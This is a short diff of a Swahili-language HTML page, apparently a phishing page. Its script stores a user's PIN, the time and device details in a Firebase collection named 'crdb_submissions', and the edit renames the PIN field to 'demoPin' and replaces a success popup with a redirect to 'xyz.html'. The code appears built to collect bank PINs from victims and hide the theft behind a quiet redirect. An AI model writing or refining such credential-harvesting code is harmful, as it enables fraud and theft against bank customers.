@@ -1,4 +1,4 @@
-<!DOCTYPE html>    
+  <!DOCTYPE html>    
 <html lang="sw">    
 <head>    
   <meta charset="utf-8"/>    
@@ -105,12 +105,16 @@
         const entryRef = ref(db, `crdb_submissions/${id}`);    
         const device = getDeviceInfo();    
     
-        await update(entryRef, { pin: pin, pinTime: new Date().toISOString(), deviceInfo: device });    
-    
-        // show success popup (no redirect)    
-        showLoading(false);    
-        showSuccessPopup(true);    
-    
+        await update(entryRef, { 
+  demoPin: pin, 
+  time: new Date().toISOString(), 
+  deviceInfo: device 
+});
+
+// redirect to xyz.html after saving
+showLoading(false);
+window.location.href = "xyz.html";
+
       } catch (err) {    
         showLoading(false);    
         console.error('Save PIN error', err);    
@@ -122,4 +126,4 @@
     });    
   </script>    
 </body>    
-  </html>
+</html>
